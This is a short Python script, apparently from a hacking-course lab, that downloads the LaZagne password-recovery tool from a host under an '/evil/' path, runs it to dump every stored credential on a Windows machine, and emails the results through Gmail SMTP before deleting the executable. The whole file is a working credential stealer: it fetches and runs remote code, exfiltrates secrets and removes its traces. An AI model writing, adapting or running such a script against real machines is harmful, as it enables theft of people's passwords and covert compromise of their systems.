#!/usr/bin/env python3

# Run on the Windows 10 VM

import os  # https://docs.python.org/3/library/os.html
import requests  # https://docs.python-requests.org/en/latest/
import smtplib  # https://docs.python.org/3/library/smtplib.html
import subprocess  # https://docs.python.org/3/library/subprocess.html
import tempfile  # https://docs.python.org/3/library/tempfile.html


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as output_file:
        output_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://192.168.122.108/evil/lazagne.exe")
result = subprocess.check_output("lazagne.exe all", shell=True)
send_mail("username@gmail.com", "password", result)
os.remove("lazagne.exe")
